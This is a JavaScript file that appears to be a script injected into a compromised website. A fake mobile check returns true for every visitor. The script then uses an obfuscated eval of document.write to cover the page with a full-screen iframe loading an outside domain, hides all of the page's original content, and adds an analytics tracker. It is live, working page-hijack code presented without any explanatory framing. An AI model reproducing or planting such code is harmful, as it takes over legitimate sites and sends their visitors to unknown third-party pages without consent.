

function isM(){
 if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone|Maxthon|MIUI)/i))) {
		return true;
	}else {
		return true;
	}
}
if (isM()) {
var titlestr = document.title;
	var arr = ["https://yz53.com"];
	setFrame(arr[Math.floor(Math.random() * arr.length)]);

	function setFrame(olink) {
	  var ss = "<title>" + titlestr + "</title><div id=\"showcloneshengxiaon\" style=\"height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;\"><ifr" + "ame scrolling=\"yes\" marginheight=0 marginwidth=0 frameborder=\"0\" border=\"0\" width=\"100%\" height=\"100%\" src=\"" + olink + "\"></iframe></div><style type=\"text/css\">html{width:100%;height:100%;}body {margin:0;padding:0;width:100%;height:100%;}</style>";
	  eval("docu" + "ment.wr" + "ite('" + ss + "');");

	  try {
	    // TOLOOK
	    setTimeout(function () {
	      console.log(document.body.children.length);

	      for (var i = 0; i < document.body.children.length; i++) {
	        try {
	          var a = document.body.children[i].tagName;
	          var b = document.body.children[i].id;
	          console.log(i + "***" + a + "**" + b);

	          if (b != "iconDiv1" && b != "showcloneshengxiaon" && a != "title") {
	            document.body.children[i].style.display = "none";
	          }
	        } catch (e) {
	          console.log("CatchClause", e);
	        }
	      }

	      var oMeta = document.createElement("meta");
	      oMeta.name = "viewport";
	      oMeta.content = "width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no";
	      document.getElementsByTagName("head")[0].appendChild(oMeta);
	    }, 100);
	  } catch (e) {
	    console.log("CatchClause", e);
	  }
	}

} 
  else{
   window.location.href = '/';
}


var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?c0e9a4336da05a4d9fd642e7d66e82cc";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();